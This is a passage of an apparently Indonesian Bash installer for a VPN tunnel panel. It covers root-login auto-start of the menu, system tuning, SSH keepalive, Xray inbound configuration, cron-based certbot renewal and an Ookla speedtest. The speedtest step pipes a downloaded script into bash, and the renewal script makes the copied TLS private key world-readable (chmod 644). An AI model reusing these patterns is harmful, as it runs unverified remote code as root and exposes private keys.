        -days 3650 -nodes -x509 \
        -subj "/C=ID/ST=Jakarta/L=Jakarta/O=VPN/CN=${DOMAIN}" \
        -keyout /etc/xray/xray.key \
        -out /etc/xray/xray.crt 2>/dev/null



}







#================================================



# SETUP MENU COMMAND



#================================================







setup_menu_command() {

    # Deploy quick-test.sh health checker (dari folder yang sama dgn tunnel.sh)
    local qs_src="$(dirname "$SCRIPT_PATH")/quick-test.sh"
    if [[ -f "$qs_src" ]]; then
        cp "$qs_src" /root/quick-test.sh 2>/dev/null && chmod +x /root/quick-test.sh 2>/dev/null
    elif [[ -f ./quick-test.sh ]]; then
        cp ./quick-test.sh /root/quick-test.sh 2>/dev/null && chmod +x /root/quick-test.sh 2>/dev/null
    fi



    # Buat command shortcut 'menu'



    printf '#!/bin/bash\n[[ -f /root/tunnel.sh ]] && exec bash /root/tunnel.sh || echo "tunnel.sh tidak ditemukan!"\n' \
        > /usr/local/bin/menu



    chmod +x /usr/local/bin/menu







    # ── METODE 1: /etc/profile.d/ — paling reliable untuk SSH login ──



    # Ini dijalankan untuk SEMUA interactive login shell (ssh, su -, dll)



    cat > /etc/profile.d/vpn-panel.sh << 'PROFILEEOF'



# VPN Panel Auto-Start



if [ "$(id -u)" -eq 0 ] && [ -n "$PS1" ] && [ -z "$VPN_MENU_RUNNING" ]; then



    export VPN_MENU_RUNNING=1



    mesg n 2>/dev/null



    # Pakai source (.) agar setelah exit menu, shell login tetap hidup



    [ -f /root/tunnel.sh ] && . /root/tunnel.sh



fi



PROFILEEOF



    chmod 644 /etc/profile.d/vpn-panel.sh







    # ── METODE 2: .bashrc sebagai fallback ──



    # Bersihkan entri lama dulu



    if [[ -f /root/.bashrc ]]; then



        awk '



            /# VPN Panel Auto-Start/ { skip=1 }



            skip && /^fi[[:space:]]*$/ { skip=0; next }



            !skip { print }



        ' /root/.bashrc > /tmp/_bashrc_clean.tmp 2>/dev/null && \
        grep -v -E 'tunnel\.sh|VPN_MENU_RUNNING|mesg n 2>|# VPN Panel' \
            /tmp/_bashrc_clean.tmp > /tmp/_bashrc_clean2.tmp 2>/dev/null && \
        mv /tmp/_bashrc_clean2.tmp /root/.bashrc



        rm -f /tmp/_bashrc_clean.tmp /tmp/_bashrc_clean2.tmp 2>/dev/null || true



    fi



    # Tulis entri baru di .bashrc



    if ! grep -q "VPN Panel Auto-Start" /root/.bashrc 2>/dev/null; then



        printf '\n# VPN Panel Auto-Start\n' >> /root/.bashrc



        printf 'if [ -n "$PS1" ] && [ "$EUID" -eq 0 ] && [ -z "$VPN_MENU_RUNNING" ]; then\n' >> /root/.bashrc



        printf '    export VPN_MENU_RUNNING=1\n' >> /root/.bashrc



        printf '    mesg n 2>/dev/null\n' >> /root/.bashrc



        printf '    [ -f /root/tunnel.sh ] && . /root/tunnel.sh\n' >> /root/.bashrc



        printf 'fi\n' >> /root/.bashrc



    fi







    # Suppress system wall messages



    mkdir -p /etc/systemd/journald.conf.d



    printf '[Journal]\nForwardToWall=no\n' > /etc/systemd/journald.conf.d/no-wall.conf



    systemctl restart systemd-journald >/dev/null 2>&1 || true



    touch /root/.hushlogin 2>/dev/null || true



}







#================================================



# SETUP SWAP



#================================================







setup_swap() {



    clear



    print_menu_header "SETUP SWAP 1GB"



    local swap_total; swap_total=$(free -m | awk 'NR==3{print $2}')



    if [[ "$swap_total" -gt 0 ]]; then



        echo -e "  ${YELLOW}Swap ada: ${swap_total}MB${NC}"



        swapoff -a 2>/dev/null



        sed -i '/swapfile/d' /etc/fstab



        rm -f /swapfile



    fi



    echo -e "  ${CYAN}Creating 1GB swap...${NC}"



    fallocate -l 1G /swapfile 2>/dev/null || dd if=/dev/zero of=/swapfile bs=1M count=1024 2>/dev/null



    chmod 600 /swapfile



    mkswap /swapfile >/dev/null 2>&1



    swapon /swapfile



    grep -q "/swapfile" /etc/fstab || echo "/swapfile none swap sw 0 0" >> /etc/fstab



    echo -e "  ${GREEN}✔ Swap 1GB OK!${NC}"



    sleep 2



}







#================================================



# OPTIMIZE VPN



#================================================







optimize_vpn() {



    echo -e "  ${CYAN}Mengoptimasi sistem...${NC}"







    # Sysctl tuning — hapus tw_reuse (usang di kernel 5.x+), tambah fastopen + mtu probing



    cat > /etc/sysctl.d/99-vpn.conf << 'SYSEOF'



net.ipv4.tcp_keepalive_time = 30



net.ipv4.tcp_keepalive_intvl = 5



net.ipv4.tcp_keepalive_probes = 6



net.ipv4.tcp_fin_timeout = 10



net.core.rmem_max = 67108864



net.core.wmem_max = 67108864



net.ipv4.tcp_rmem = 4096 87380 67108864



net.ipv4.tcp_wmem = 4096 65536 67108864



net.core.netdev_max_backlog = 250000



net.core.somaxconn = 65535



net.ipv4.tcp_max_syn_backlog = 65535



net.core.default_qdisc = fq



net.ipv4.tcp_congestion_control = bbr



net.ipv4.tcp_fastopen = 3



net.ipv4.tcp_mtu_probing = 1



net.ipv4.ip_forward = 1



vm.swappiness = 10



net.ipv6.conf.all.disable_ipv6 = 1



net.ipv6.conf.default.disable_ipv6 = 1



SYSEOF







    # Load BBR module jika support



    if modprobe tcp_bbr 2>/dev/null; then



        echo "tcp_bbr" > /etc/modules-load.d/bbr.conf 2>/dev/null



    else



        modprobe tcp_htcp 2>/dev/null || true



    fi







    # Apply settings



    sysctl --system >/dev/null 2>&1 || sysctl -p /etc/sysctl.d/99-vpn.conf >/dev/null 2>&1







    # Verifikasi apakah BBR benar-benar aktif



    local cc



    cc=$(sysctl -n net.ipv4.tcp_congestion_control 2>/dev/null)



    if [[ "$cc" == "bbr" ]]; then



        echo -e "  ${GREEN}✔ BBR active: ${cc}${NC}"



    elif [[ -n "$cc" ]]; then



        echo -e "  ${YELLOW}⚠ BBR tidak support, fallback ke: ${cc}${NC}"



    else



        echo -e "  ${YELLOW}⚠ Tidak bisa verifikasi congestion control${NC}"



    fi







    # Set file descriptor limits



    cat > /etc/security/limits.d/99-vpn.conf << 'LIMEOF'



* soft nofile 65535



* hard nofile 65535



root soft nofile 65535



root hard nofile 65535



LIMEOF







    echo -e "  ${GREEN}✔ File descriptor limits: 65535${NC}"



    echo -e "  ${GREEN}✔ Optimasi selesai!${NC}"



    sleep 1



}







#================================================



# SETUP KEEPALIVE



#================================================







setup_keepalive() {



    local sshcfg="/etc/ssh/sshd_config"



    grep -q "^ClientAliveInterval" "$sshcfg" && \
        sed -i 's/^ClientAliveInterval.*/ClientAliveInterval 30/' "$sshcfg" || \
        echo "ClientAliveInterval 30" >> "$sshcfg"



    grep -q "^ClientAliveCountMax" "$sshcfg" && \
        sed -i 's/^ClientAliveCountMax.*/ClientAliveCountMax 6/' "$sshcfg" || \
        echo "ClientAliveCountMax 6" >> "$sshcfg"



    grep -q "^TCPKeepAlive" "$sshcfg" && \
        sed -i 's/^TCPKeepAlive.*/TCPKeepAlive yes/' "$sshcfg" || \
        echo "TCPKeepAlive yes" >> "$sshcfg"



    # Ubuntu 22+ pakai 'ssh', Ubuntu 20 pakai 'sshd'



    local ssh_svc; ssh_svc=$(get_ssh_service_name)



    systemctl restart "$ssh_svc" 2>/dev/null







    mkdir -p /etc/systemd/system/xray.service.d



    cat > /etc/systemd/system/xray.service.d/override.conf << 'XEOF'



[Service]



Restart=always



RestartSec=3



LimitNOFILE=65535



XEOF







    cat > /usr/local/bin/vpn-keepalive.sh << 'KAEOF'



#!/bin/bash



while true; do



    GW=$(ip route | awk '/default/{print $3; exit}')



    [[ -n "$GW" ]] && ping -c1 -W2 "$GW" >/dev/null 2>&1



    ping -c1 -W2 8.8.8.8 >/dev/null 2>&1



    sleep 25



done



KAEOF



    chmod +x /usr/local/bin/vpn-keepalive.sh







    cat > /etc/systemd/system/vpn-keepalive.service << 'KASEOF'



[Unit]



Description=VPN Keepalive



After=network.target xray.service







[Service]



Type=simple



ExecStart=/usr/local/bin/vpn-keepalive.sh



Restart=always



RestartSec=5



LimitNOFILE=65535







[Install]



WantedBy=multi-user.target



KASEOF



    systemctl daemon-reload



    systemctl enable vpn-keepalive 2>/dev/null



    systemctl restart vpn-keepalive 2>/dev/null



}







#================================================



# HAPROXY CONFIG - Support WS TLS + gRPC di 443



#================================================







configure_haproxy() {



    # HAProxy config minimal - nginx langsung handle port 443



    # HAProxy tetap enabled agar service tidak error tapi tidak bind port



    cat > /etc/haproxy/haproxy.cfg << 'HAEOF'



global



    log /dev/log local0



    maxconn 65535



    daemon







defaults



    log global



    mode tcp



    timeout connect 5s



    timeout client  1h



    timeout server  1h



    option dontlognull



HAEOF



}







#================================================



# CHANGE DOMAIN



#================================================







change_domain() {



    clear



    print_menu_header "CHANGE DOMAIN"



    echo -e "  Current: ${GREEN}${DOMAIN:-Not Set}${NC}"



    echo ""



    setup_domain



    echo -e "  ${YELLOW}Jalankan Fix Certificate [11]!${NC}"



    sleep 3



}







#================================================



# FIX CERTIFICATE



#================================================







fix_certificate() {



    clear



    print_menu_header "FIX / RENEW CERTIFICATE"



    [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)



    [[ -z "$DOMAIN" ]] && { echo -e "  ${RED}✘ Domain belum diset!${NC}"; sleep 3; return; }



    echo -e "  Domain: ${GREEN}${DOMAIN}${NC}"



    echo ""



    # Stop service yang pakai port 80/443 dulu



    systemctl stop haproxy 2>/dev/null



    systemctl stop nginx   2>/dev/null



    sleep 1



    get_ssl_cert



    # Restart dengan validasi



    restart_service_safe "nginx" "nginx -t"



    restart_service_safe "haproxy"



    restart_service_safe "xray" "xray -test -config $XRAY_CONFIG"



    echo -e "  ${GREEN}✔ Done!${NC}"



    sleep 3



}







#================================================



# SSL AUTO RENEW — Cronjob-based Let's Encrypt renewal



#================================================







_ssl_auto_renew_setup() {



    clear



    print_menu_header "SETUP SSL AUTO-RENEW"



    [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)



    [[ -z "$DOMAIN" ]] && { echo -e "  ${RED}✘ Domain belum diset! Setup domain dulu [menu 10].${NC}"; sleep 3; return; }







    local domain_type="custom"



    [[ -f "$DOMAIN_TYPE_FILE" ]] && domain_type=$(cat "$DOMAIN_TYPE_FILE")



    if [[ "$domain_type" != "custom" ]]; then



        echo -e "  ${YELLOW}⚠ Domain auto-generated (nip.io) — tidak perlu SSL renew.${NC}"



        echo -e "  ${DIM}SSL self-signed tidak expired selama 10 tahun.${NC}"



        sleep 3; return



    fi







    # Cek apakah certbot tersedia



    if ! command -v certbot >/dev/null 2>&1; then



        echo -e "  ${CYAN}Installing certbot dulu...${NC}"



        install_certbot_compat "custom"



        if ! command -v certbot >/dev/null 2>&1; then



            echo -e "  ${RED}✘ certbot gagal diinstall!${NC}"



            sleep 3; return



        fi



    fi







    echo -e "  Domain : ${GREEN}${DOMAIN}${NC}"



    echo -e "  ${DIM}Auto-renew akan berjalan tanggal 1 & 15 setiap bulan jam 3 pagi${NC}"



    echo ""







    # Buat script auto-renew



    cat > /usr/local/bin/ssl-auto-renew.sh << 'SSLAUTORENEW'



#!/bin/bash



# SSL Auto-Renew Script — Youzin Crabz Tunel



# Dijalankan via cron: 0 3 1,15 * *



PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin



DOMAIN_FILE="/root/domain"



LOG="/var/log/ssl-renew.log"







exec >> "$LOG" 2>&1



echo "========================================"



echo "SSL Auto-Renew: $(date)"







[[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs) || { echo "ERROR: Domain file not found"; exit 1; }



[[ -z "$DOMAIN" ]] && { echo "ERROR: Domain not set"; exit 1; }







# Stop services yang pakai port 80



systemctl stop nginx 2>/dev/null



systemctl stop haproxy 2>/dev/null



sleep 2







# Renew via certbot standalone



if certbot renew --standalone --non-interactive --agree-tos --no-random-sleep-on-renew --quiet 2>/dev/null; then



    echo "certbot renew: SUCCESS"



    if [[ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ]]; then



        cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /etc/xray/xray.crt



        cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /etc/xray/xray.key



        chmod 644 /etc/xray/xray.*



        echo "Cert copied to /etc/xray/: OK"



    fi



else



    echo "certbot renew: FAILED — trying certonly fallback..."



    # Fallback: certonly



    if certbot certonly --standalone -d "$DOMAIN" --non-interactive --agree-tos --register-unsafely-without-email --quiet 2>/dev/null; then



        echo "certbot certonly: SUCCESS"



        if [[ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ]]; then



            cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /etc/xray/xray.crt



            cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /etc/xray/xray.key



            chmod 644 /etc/xray/xray.*



            echo "Cert copied to /etc/xray/: OK"



        fi



    else



        echo "certbot certonly: FAILED"



    fi



fi







# Restart services



systemctl start nginx 2>/dev/null



systemctl start haproxy 2>/dev/null







# Reload nginx & restart xray if config valid



nginx -t 2>/dev/null && systemctl reload nginx 2>/dev/null



xray -test -config /usr/local/etc/xray/config.json >/dev/null 2>&1 && systemctl restart xray 2>/dev/null







echo "SSL Auto-Renew: DONE — $(date)"



SSLAUTORENEW



    chmod +x /usr/local/bin/ssl-auto-renew.sh







    # Pasang cronjob: tgl 1 dan 15 setiap bulan jam 3 pagi



    (crontab -l 2>/dev/null | grep -v "ssl-auto-renew"; echo "0 3 1,15 * * /usr/local/bin/ssl-auto-renew.sh") | crontab -







    echo -e "  ${GREEN}✔ SSL Auto-Renew AKTIF!${NC}"



    echo -e "  ${DIM}Script : /usr/local/bin/ssl-auto-renew.sh${NC}"



    echo -e "  ${DIM}Log    : /var/log/ssl-renew.log${NC}"



    echo -e "  ${DIM}Jadwal : Tanggal 1 & 15, jam 3 pagi${NC}"



    echo ""



    echo -e "  ${YELLOW}Tips: Cek log dengan: tail -f /var/log/ssl-renew.log${NC}"



    sleep 3



}







_ssl_auto_renew_disable() {



    clear



    print_menu_header "DISABLE SSL AUTO-RENEW"



    if crontab -l 2>/dev/null | grep -q "ssl-auto-renew"; then



        echo -e "  ${YELLOW}Cronjob SSL Auto-Renew terdeteksi:${NC}"



        crontab -l 2>/dev/null | grep "ssl-auto-renew" | sed "s/^/    /"



        echo ""



        read -rp "  Yakin nonaktifkan? [y/N]: " yn



        if [[ "${yn,,}" == "y" ]]; then



            crontab -l 2>/dev/null | grep -v "ssl-auto-renew" | crontab -



            rm -f /usr/local/bin/ssl-auto-renew.sh



            echo -e "  ${GREEN}✔ SSL Auto-Renew dinonaktifkan!${NC}"



        else



            echo -e "  ${DIM}Dibatalkan.${NC}"



        fi



    else



        echo -e "  ${YELLOW}SSL Auto-Renew memang belum aktif.${NC}"



    fi



    sleep 2



}







_ssl_auto_renew_status() {



    if crontab -l 2>/dev/null | grep -q "ssl-auto-renew"; then



        echo -e "  ${GREEN}● SSL Auto-Renew: AKTIF${NC}"



        crontab -l 2>/dev/null | grep "ssl-auto-renew" | sed 's/^/    /'



    else



        echo -e "  ${YELLOW}○ SSL Auto-Renew: NON-AKTIF${NC}"



    fi



}







menu_ssl() {



    while true; do



        clear



        print_menu_header "SSL CERTIFICATE MANAGER"



        [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)



        echo -e "  Domain : ${GREEN}${DOMAIN:-Not Set}${NC}"



        echo ""



        _ssl_auto_renew_status



        echo ""



        printf "  ${WHITE}[1]${NC} Fix / Renew Certificate (manual)



"



        printf "  ${WHITE}[2]${NC} Setup SSL Auto-Renew (cronjob)



"



        printf "  ${WHITE}[3]${NC} Disable SSL Auto-Renew



"



        printf "  ${WHITE}[4]${NC} Test Auto-Renew sekarang



"



        printf "  ${WHITE}[5]${NC} Lihat log SSL renew



"



        printf "  ${RED}[0]${NC} Kembali



"



        echo ""



        read -rp "  Select: " ssl_choice



        case $ssl_choice in



            1) fix_certificate ;;



            2) _ssl_auto_renew_setup ;;



            3) _ssl_auto_renew_disable ;;



            4)



                clear



                print_menu_header "TEST SSL AUTO-RENEW"



                if [[ -x /usr/local/bin/ssl-auto-renew.sh ]]; then



                    echo -e "  ${CYAN}Menjalankan auto-renew...${NC}"



                    /usr/local/bin/ssl-auto-renew.sh



                    echo ""



                    echo -e "  ${GREEN}✔ Selesai! Cek log: tail /var/log/ssl-renew.log${NC}"



                else



                    echo -e "  ${RED}✘ Script auto-renew belum terinstall. Setup dulu [menu 2].${NC}"



                fi



                echo ""; read -rp "  Tekan ENTER..." ;;



            5)



                clear



                print_menu_header "LOG SSL AUTO-RENEW"



                if [[ -f /var/log/ssl-renew.log ]]; then



                    tail -50 /var/log/ssl-renew.log



                    echo ""



                    printf "  ${DIM}Log lengkap: /var/log/ssl-renew.log${NC}



"



                else



                    echo -e "  ${DIM}Log belum tersedia.${NC}"



                fi



                echo ""; read -rp "  Tekan ENTER..." ;;



            0) break ;;



            *) echo -e "  ${RED}✘ Invalid!${NC}"; sleep 1 ;;



        esac



    done



}







#================================================



# SPEEDTEST - Ookla Official CLI



#================================================







run_speedtest() {



    clear



    print_menu_header "SPEEDTEST BY OOKLA"



    echo -e "  ${YELLOW}Menyiapkan speedtest...${NC}"







    # Install Ookla speedtest CLI jika belum ada



    if ! command -v speedtest >/dev/null 2>&1; then



        echo -e "  ${CYAN}Installing Speedtest CLI (Ookla)...${NC}"



        # Install via official repo



        if curl -s https://packagecloud.io/install/repositories/ookla/speedtest-cli/script.deb.sh | bash >/dev/null 2>&1; then



            apt-get update -qq >/dev/null 2>&1



            apt-get install -y speedtest >/dev/null 2>&1



        fi



    fi







    # Cek ulang setelah install



    if ! command -v speedtest >/dev/null 2>&1; then



        echo -e "  ${RED}✘ Speedtest CLI tidak bisa diinstall!${NC}"



        echo -e "  ${YELLOW}Mencoba install manual...${NC}"



        local arch; arch=$(uname -m)



        local dl_url=""



        case "$arch" in



            x86_64)  dl_url="https://install.speedtest.net/app/cli/ookla-speedtest-1.2.0-linux-x86_64.tgz" ;;



            aarch64) dl_url="https://install.speedtest.net/app/cli/ookla-speedtest-1.2.0-linux-aarch64.tgz" ;;



            armv7l)  dl_url="https://install.speedtest.net/app/cli/ookla-speedtest-1.2.0-linux-armhf.tgz" ;;



            *)       echo -e "  ${RED}✘ Arsitektur tidak didukung: ${arch}${NC}"; echo ""; read -rp "  Press any key to back..."; return ;;



        esac



        mkdir -p /tmp/speedtest_dl



        curl -L --max-time 60 "$dl_url" -o /tmp/speedtest_dl/speedtest.tgz 2>/dev/null



        if [[ -f /tmp/speedtest_dl/speedtest.tgz ]]; then



            tar -xzf /tmp/speedtest_dl/speedtest.tgz -C /tmp/speedtest_dl/ 2>/dev/null



            if [[ -f /tmp/speedtest_dl/speedtest ]]; then



                cp /tmp/speedtest_dl/speedtest /usr/local/bin/speedtest



                chmod +x /usr/local/bin/speedtest



                echo -e "  ${GREEN}✔ Speedtest CLI berhasil diinstall!${NC}"



            fi



        fi



        rm -rf /tmp/speedtest_dl 2>/dev/null



    fi







    if ! command -v speedtest >/dev/null 2>&1; then



        echo -e "  ${RED}✘ Speedtest tidak tersedia. Cek koneksi internet!${NC}"



        echo ""



        read -rp "  Press any key to back..."



        return



    fi







    echo -e "  ${YELLOW}Testing... harap tunggu ~30 detik${NC}"



    echo ""







    local result



    result=$(speedtest --accept-license --accept-gdpr 2>/dev/null)







    if [[ -z "$result" ]]; then



        echo -e "  ${RED}✘ Speedtest gagal! Coba lagi nanti.${NC}"



        echo ""



        read -rp "  Press any key to back..."



        return



    fi







    # Parse hasil speedtest Ookla



    local server latency dl ul url isp



    server=$(echo "$result"  | grep -i "Server:"   | sed 's/.*Server: //'  | head -1)



    isp=$(echo "$result"     | grep -i "ISP:"       | sed 's/.*ISP: //'     | head -1)



    latency=$(echo "$result" | grep -i "Latency:"   | awk '{print $2,$3}'   | head -1)



    dl=$(echo "$result"      | grep -i "Download:"  | awk '{print $2,$3}'   | head -1)



    ul=$(echo "$result"      | grep -i "Upload:"    | awk '{print $2,$3}'   | head -1)



    url=$(echo "$result"     | grep -i "Result URL:"| awk '{print $NF}'     | head -1)







    local W; W=$(get_width)



    local inner=$(( W - 4 ))



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC}: ${GREEN}%s${NC}\n" "ISP"        "${isp:-N/A}"



    printf "  ${WHITE}%-16s${NC}: ${GREEN}%s${NC}\n" "Server"     "${server:-N/A}"



    printf "  ${WHITE}%-16s${NC}: ${YELLOW}%s${NC}\n" "Latency"   "${latency:-N/A}"



    printf "  ${WHITE}%-16s${NC}: ${CYAN}%s${NC}\n"  "Download"   "${dl:-N/A}"



    printf "  ${WHITE}%-16s${NC}: ${CYAN}%s${NC}\n"  "Upload"     "${ul:-N/A}"



    [[ -n "$url" ]] && printf "  ${WHITE}%-16s${NC}: ${BLUE}%s${NC}\n" "Result URL" "$url"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    echo ""



    read -rp "  Press any key to back..."



}







#================================================



# FIX XRAY PERMISSIONS



#================================================







fix_xray_permissions() {



    mkdir -p /usr/local/etc/xray /var/log/xray



    chmod 755 /usr/local/etc/xray



    chmod 755 /var/log/xray



    touch /var/log/xray/access.log /var/log/xray/error.log



    chmod 644 /var/log/xray/access.log /var/log/xray/error.log



    chmod 644 /usr/local/etc/xray/config.json 2>/dev/null



    chown -R nobody:nogroup /var/log/xray 2>/dev/null



}







#================================================



# CREATE XRAY CONFIG



# TLS:    443 (via Nginx direct SSL)



# NonTLS: 80  (via Nginx  → 8080)



# gRPC:   443 (via HAProxy → 8444, H2 detect)



#================================================







create_xray_config() {



    mkdir -p /var/log/xray /usr/local/etc/xray



    cat > "$XRAY_CONFIG" << 'XRAYEOF'



{



  "log": {



    "access": "/var/log/xray/access.log",



    "error": "/var/log/xray/error.log",



    "loglevel": "warning"



  },



  "inbounds": [



    {



      "port": 8080,



      "protocol": "vmess",



      "settings": {"clients": []},



      "streamSettings": {



        "network": "ws",



        "wsSettings": {"path": "/vmess","headers": {}}



      },



      "sniffing": {"enabled": true,"destOverride": ["http","tls"]},



      "tag": "vmess-ws"



    },



    {



      "port": 8081,



      "protocol": "vless",



      "settings": {"clients": [],"decryption": "none"},



      "streamSettings": {



        "network": "ws",



        "wsSettings": {"path": "/vless","headers": {}}



      },



      "sniffing": {"enabled": true,"destOverride": ["http","tls"]},



      "tag": "vless-ws"



    },



    {



      "port": 8082,



      "protocol": "trojan",



      "settings": {"clients": []},



      "streamSettings": {



        "network": "ws",



        "wsSettings": {"path": "/trojan","headers": {}}



      },



      "sniffing": {"enabled": true,"destOverride": ["http","tls"]},



      "tag": "trojan-ws"



    },



    {



      "port": 8444,



      "protocol": "vmess",



      "settings": {"clients": []},



      "streamSettings": {



        "network": "grpc",



        "grpcSettings": {"serviceName": "vmess-grpc"}



      },



      "tag": "vmess-grpc"



    },



    {



      "port": 8445,



      "protocol": "vless",



      "settings": {"clients": [],"decryption": "none"},



      "streamSettings": {



        "network": "grpc",



        "grpcSettings": {"serviceName": "vless-grpc"}



      },



      "tag": "vless-grpc"



    },



    {



      "port": 8446,



      "protocol": "trojan",



      "settings": {"clients": []},



      "streamSettings": {



        "network": "grpc",



        "grpcSettings": {"serviceName": "trojan-grpc"}



      },



      "tag": "trojan-grpc"



    }



  ],



  "outbounds": [



    {"protocol": "freedom","settings": {"domainStrategy": "UseIPv4"},"tag": "direct"},



    {"protocol": "blackhole","settings": {},"tag": "block"}



  ],



  "routing": {



    "domainStrategy": "IPIfNonMatch",



    "rules": [{"type": "field","ip": ["geoip:private"],"outboundTag": "block"}]



  }



}



XRAYEOF



    fix_xray_permissions



}







#================================================



# INFO PORT



#================================================







show_info_port() {



    clear



    local W; W=$(get_width)



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}SERVER PORT INFORMATION${NC}"



    _box_divider $W



    _box_row $W "SSH OpenSSH"       "Port: 22"



    _box_row $W "SSH Dropbear"      "Port: 222"



    _box_row $W "Nginx TLS"         "Port: 443 (SSL direct)"



    _box_row $W "Nginx NonTLS"      "Port: 80"



    _box_row $W "Nginx Download"    "Port: 81"



    _box_row $W "Xray VMess WS"     "Port internal: 8080"



    _box_row $W "Xray VLess WS"     "Port internal: 8081"



    _box_row $W "Xray Trojan WS"    "Port internal: 8082"



    _box_row $W "Xray VMess gRPC"   "Port internal: 8444"



    _box_row $W "Xray VLess gRPC"   "Port internal: 8445"



    _box_row $W "Xray Trojan gRPC"  "Port internal: 8446"



    _box_row $W "BadVPN UDP"        "Port: 7100-7300"



    _box_row $W "ZI VPN UDP"        "Port: 7400-7500"



    _box_bottom $W



    echo ""



    read -rp "  Tekan Enter untuk kembali..."



}







#================================================



# PING CHECK - CEK SEMUA PROTOCOL



#================================================







ping_check() {



    clear



    local W; W=$(get_width)



    [[ -f "$DOMAIN_FILE" ]] && DOMAIN=$(tr -d '\n\r' < "$DOMAIN_FILE" | xargs)



    local ip_vps; ip_vps=$(get_ip)







    local ssh_svc_name; ssh_svc_name=$(get_ssh_service_name)



    _port_listening() { ss -tlnp 2>/dev/null | awk '{print $4}' | grep -qE ":${1}$"; }



    _svc_up()         { systemctl is-active --quiet "$1" 2>/dev/null; }



    _nc_local()       { nc -z -w 1 127.0.0.1 "$1" 2>/dev/null; }



    _prow() {



        local label="$1" port="$2" ok="$3"



        local W2; W2=$(get_width)



        if [ "$ok" = "0" ]; then



            printf "  %-38s ${GREEN}● ONLINE${NC}\n" "$label (port $port)"



        else



            printf "  %-38s ${RED}○ OFFLINE${NC}\n" "$label (port $port)"



        fi



    }







    _box_top $W



    _box_center $W "${YELLOW}${BOLD}PING CHECK ALL PROTOCOL${NC}"



    _box_divider $W



    _box_left $W "Domain : ${GREEN}${DOMAIN:-N/A}${NC}"



    _box_left $W "IP VPS : ${GREEN}${ip_vps}${NC}"



    _box_divider $W



    _box_center $W "${WHITE}SSH & DROPBEAR${NC}"



    _box_divider $W



    _nc_local 22  && _prow "SSH OpenSSH"  "22"  "0" || _prow "SSH OpenSSH"  "22"  "1"



    _nc_local 222 && _prow "SSH Dropbear" "222" "0" || _prow "SSH Dropbear" "222" "1"



    _box_divider $W



    _box_center $W "${WHITE}TLS PORT 443${NC}"



    _box_divider $W



    if _svc_up nginx && _port_listening 443; then



        _port_listening 8080 && _prow "VMess WS TLS"   "443" "0" || _prow "VMess WS TLS"   "443" "1"



        _port_listening 8081 && _prow "VLess WS TLS"   "443" "0" || _prow "VLess WS TLS"   "443" "1"



        _port_listening 8082 && _prow "Trojan WS TLS"  "443" "0" || _prow "Trojan WS TLS"  "443" "1"



        _port_listening 8444 && _prow "VMess gRPC TLS" "443" "0" || _prow "VMess gRPC TLS" "443" "1"



        _port_listening 8445 && _prow "VLess gRPC TLS" "443" "0" || _prow "VLess gRPC TLS" "443" "1"



        _port_listening 8446 && _prow "Trojan gRPC"    "443" "0" || _prow "Trojan gRPC"    "443" "1"



    else



        _prow "Nginx SSL"  "443" "1"



    fi



    _box_divider $W



    _box_center $W "${WHITE}NO-TLS PORT 80${NC}"



    _box_divider $W



    if _svc_up nginx && _port_listening 80; then



        _port_listening 8080 && _prow "VMess WS NonTLS"  "80" "0" || _prow "VMess WS NonTLS"  "80" "1"



        _port_listening 8081 && _prow "VLess WS NonTLS"  "80" "0" || _prow "VLess WS NonTLS"  "80" "1"



        _port_listening 8082 && _prow "Trojan WS NonTLS" "80" "0" || _prow "Trojan WS NonTLS" "80" "1"



    else



        _prow "Nginx HTTP" "80" "1"



    fi



    _box_divider $W



    _box_center $W "${WHITE}SERVICE STATUS${NC}"



    _box_divider $W



    _box_row $W "XRAY:     $( _svc_up xray      && echo '● ONLINE' || echo '○ OFFLINE')" \
               "NGINX:    $( _svc_up nginx     && echo '● ONLINE' || echo '○ OFFLINE')"



    _box_row $W "DROPBEAR: $( _svc_up dropbear  && echo '● ONLINE' || echo '○ OFFLINE')" \
               "HAPROXY:  $( _svc_up haproxy   && echo '● ONLINE' || echo '○ OFFLINE')"



    _box_row $W "SSH:      $( _svc_up "$ssh_svc_name" && echo '● ONLINE' || echo '○ OFFLINE')" \
               "UDP CUST: $( _svc_up udp-custom && echo '● ONLINE' || echo '○ OFFLINE')"



    _box_bottom $W



    echo ""



    read -rp "  Tekan Enter untuk kembali..."



}







#================================================



# CEK EXPIRED



#================================================







cek_expired() {



    clear



    print_menu_header "CEK EXPIRED ACCOUNTS"



    local today found=0



    today=$(date +%s)



    shopt -s nullglob



    for f in "$AKUN_DIR"/*.txt; do



        [[ ! -f "$f" ]] && continue



        local exp_str exp_ts uname diff



        exp_str=$(grep "EXPIRED=" "$f" 2>/dev/null | head -1 | cut -d= -f2-)



        [[ -z "$exp_str" ]] && continue



        exp_ts=$(parse_exp_ts "$exp_str")



        [[ -z "$exp_ts" ]] && continue



        uname=$(basename "$f" .txt)



        diff=$(( (exp_ts - today) / 86400 ))



        if [[ $diff -le 3 ]]; then



            found=1



            if [[ $diff -lt 0 ]]; then



                echo -e "  ${RED}✘ EXPIRED${NC}: $uname"



                echo -e "    ${YELLOW}($exp_str)${NC}"



            else



                echo -e "  ${YELLOW}⚠ ${diff} hari${NC}: $uname"



                echo -e "    ${CYAN}($exp_str)${NC}"



            fi



        fi



    done



    shopt -u nullglob



    [[ $found -eq 0 ]] && echo -e "  ${GREEN}✔ Tidak ada akun expired!${NC}"



    echo ""



    read -rp "  Press any key to back..."



}







#================================================



